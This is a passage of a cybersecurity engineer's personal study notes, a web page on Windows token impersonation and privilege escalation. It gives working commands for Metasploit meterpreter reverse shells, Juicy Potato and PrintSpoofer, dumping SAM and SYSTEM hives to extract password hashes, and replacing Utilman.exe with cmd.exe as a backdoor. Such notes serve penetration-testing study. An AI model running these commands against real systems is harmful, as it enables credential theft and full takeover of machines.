<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">



    <title>Methodology</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <div class="search-bar">
                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
                <!-- <button onclick="search()" class="search-button">Search</button> -->
                <div id="searchResults" class="search-results"></div>

              </div>

            </div>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="../../../../../index.html#home" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div> -->
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="9635a81f-eb5e-4261-9a3d-4e567e86291a" class="page sans"><header><h1 class="page-title">Token Impersonation</h1></header><div class="page-body"><ul id="1bedc72d-e777-40ff-9cbd-06168b60cf1f" class="bulleted-list"><li style="list-style-type:disc">We want to take users tokens and impersonate them</li></ul><ul id="9a639ff4-68eb-4bd1-bff4-f46145644710" class="bulleted-list"><li style="list-style-type:disc">Tokens are like cookies for windows sessions</li></ul><ul id="f4aec5d9-44be-4bdd-891f-7f2fe136a488" class="bulleted-list"><li style="list-style-type:disc">Tokens are only reset when computer restarted</li></ul><p id="dd4fca02-2142-4e64-a88c-a23ade358e62" class="">mimikatz!</p><p id="f46d232f-5287-43c3-ab17-8db8102cf18b" class="">
</p><ul id="8d4bb912-2c01-4a36-893b-58839b44c94a" class="bulleted-list"><li style="list-style-type:disc">meterpreter &gt; getprivs</li></ul><ul id="151e48c9-28e7-4631-ad1e-72ff66bb6831" class="bulleted-list"><li style="list-style-type:disc">whoami /priv</li></ul><ul id="e449c57e-c1be-459c-8538-587c34ad56fa" class="bulleted-list"><li style="list-style-type:disc">EoP impersonate privileges<ul id="446553d8-8297-4f93-82a2-3239075c8ae5" class="bulleted-list"><li style="list-style-type:circle">seDebug</li></ul><ul id="52eec157-e311-480f-8c6b-7cfd27cceb84" class="bulleted-list"><li style="list-style-type:circle">seTakeOwnership</li></ul><ul id="555de591-b786-4ec6-a822-5e961b7bb1ac" class="bulleted-list"><li style="list-style-type:circle">seimpersonate</li></ul><ul id="bfe57eae-8376-4e2d-bbb4-ccde0c6429d8" class="bulleted-list"><li style="list-style-type:circle">seAssign primary token</li></ul><ul id="9fb65b6e-61ed-43bd-ab80-ac0e62096eff" class="bulleted-list"><li style="list-style-type:circle">seCreatetoken</li></ul><p id="531e7499-ac4f-4987-89ca-e53e2fa16db7" class="">
</p></li></ul><p id="33430a9d-4af0-4acb-8d1a-70f68a1dac01" class=""><strong>potato attacks (metasploit):</strong> </p><p id="985d28d8-1714-4eb8-bc8d-a94c70af9361" class="">for impersonate and seAssignPrimaryToken</p><ul id="0900a578-7152-4852-b43c-670b229c36a2" class="bulleted-list"><li style="list-style-type:disc">taking control of service accts may give us these kind of privelege</li></ul><ul id="62a3e64a-6379-422d-8245-5f20817873ba" class="bulleted-list"><li style="list-style-type:disc">Jenkins servers → hiding creds everywhere!<ul id="797d72a8-4d62-46e4-ba6a-38050cf14649" class="bulleted-list"><li style="list-style-type:circle">also script console</li></ul><ul id="4428810b-2fe2-4562-b512-93fac3b75545" class="bulleted-list"><li style="list-style-type:circle">easy groovy reverse shells</li></ul><p id="620615ed-c647-4c5d-b113-b268073072f2" class="">use exploit/multi/script/web_delivery</p><p id="5041836b-acce-4378-a6c3-dcc7949980b1" class="">set target powershell</p><p id="2285244c-c163-4f97-8d3d-072a702860c2" class="">set payload windows/meterpreter/reverse_tcp</p><p id="03bf0639-6719-4604-b5ab-b40ce93949b4" class="">use windows/local/ms16_075_reflection</p><p id="013fe262-43e4-4bd2-860d-75bfbc7d37c8" class="">run</p><p id="336b46af-3497-420d-813f-fe5104a7656b" class="">impersonate_token “NT AUTHORITY \SYSTEM”</p><p id="10e0ca90-26c2-46b4-931f-e8232e366d80" class="">
</p><p id="3bee944f-91ab-4757-8caf-c2ea98daaf7f" class=""><strong>Alternate Data Streams:</strong></p><p id="04ab0af1-aa53-4467-822a-b950e00b23be" class="">Alternate Data Streams - <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/</a></p><p id="91bcb406-cf2c-4d13-a033-636e092dd493" class="">dir /R</p><p id="fe8c8743-1a7a-435e-a426-d2c07f34711a" class="">more &lt; hm.txt:root.txt:$DATA</p></li></ul><p id="e8266135-1553-4d5f-89e7-e0f0f78c3daf" class="">
</p><p id="5f0c0343-0f51-427a-86a1-63f0118b2b76" class=""><strong>Metasploit getsystem:</strong></p><p id="ee5d9d5e-a3df-4a59-9f39-91e2176f0b59" class="">What happens when I type getsystem? - <a href="https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/">https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/</a></p><pre id="c230c3e1-a3cf-4c4a-bad9-16a081974b6b" class="code"><code>meterpreter &gt; getsystem -h</code></pre><p id="7140b4f5-2d34-426e-8dcf-58807837ae18" class="">
</p><p id="cd6964b5-a9b7-4822-8542-42d7c1a9c32d" class=""><strong>Juicy Potato manual:</strong></p><p id="d1038a6a-d323-4e64-b650-fdf208bbdba4" class=""><a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p><pre id="bb566f98-9e8b-4cfd-82e9-1580619cd796" class="code"><code>JuicyPotato.exe -t * -p C:\Payload.exe -l &lt;LPORT&gt; -c &quot;{CLSID}”
</code></pre><pre id="7c42a0a8-87cd-40b8-b1fc-08ac93cc0029" class="code"><code>Juicy.Potato.x86.exe -t * -p C:\test.exe -l 22 -c &quot;{03ca98d6-ff5d-49b8-abc6-03dd84127020}”</code></pre><p id="660170ba-c94e-42be-8e9e-a486acbed2fd" class="">
</p><p id="ae02074b-62e5-49ac-b2f4-80d0329ba52d" class=""><strong>Printspoofer:</strong></p><p id="c33ae0af-48f9-4030-99ea-1775b4af1fbb" class=""><a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p><pre id="afb08a41-c025-48e1-9d4c-7b0fade5d028" class="code"><code>.\PrintSpoofer64.exe -c &quot;C:\inetpub\wwwroot\zen.exe&quot; -i</code></pre><p id="bec8c147-fc58-4290-875b-9a6c2316b6e3" class="">
</p><p id="37a7d338-c5dd-4607-aab1-f7163d752b9e" class="">SeBackup:</p><pre id="9ae9dfc6-0bdc-4ec9-b271-2abf79ab30be" class="code"><code>#SeBackupPrivilege Back up files and directories Disabled
#SeRestorePrivilege Restore files and directories Disabled
C:\Windows\system32&gt; reg save hklm\system C:\Users\user\system.hive
C:\Windows\system32&gt; reg save hklm\sam C:\Users\user\sam.hive
#import sam and system to kali using SMB share
#use secretsdump to dump hashes
impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code></pre><p id="c5704df2-20d6-4082-8567-bcafcd77dd5e" class="">
</p><p id="7d1ac580-96d9-438a-9d66-d81e3bcd9353" class="">SeTakeOwnership:</p><pre id="c87c5e1b-3895-4270-8763-1a29a45626b7" class="code"><code>whoami /priv
#SeTakeOwnership should be shown but might be disabled state
takeown.exe /f C:/Windows/System32/Utilman.exe
icacls C:/Windows/System32/Utilman.exe /grant user:F
copy cmd.exe Utilman.exe </code></pre></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="../../../../../../assets/js/main.js"></script>
    <script src="../../../../../../assets/js/search.js"></script>


</body>
</html>